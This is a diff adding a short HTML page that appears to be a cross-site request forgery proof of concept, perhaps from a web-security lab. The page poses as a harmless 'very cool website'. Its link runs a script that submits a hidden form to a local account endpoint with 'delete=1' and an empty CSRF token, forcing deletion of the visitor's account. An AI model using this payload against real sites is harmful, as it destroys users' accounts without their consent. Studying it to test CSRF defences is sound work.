@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      function delete_account(){
+	  document.forms.attack.submit();
+      }
+    </script>
+  </head>
+  <body>
+    This is a very cool website. <br />
+    <a href="#" onclick="delete_account()">Check it out.</a>
+    <form name="attack" action="http://localhost:3000/account" method='POST'>
+      <input type="hidden" name="delete" value="1" />
+      <input type="hidden" name="csrfToken" value="" />
+    </form>
+    
+
+  </body>
+</html>
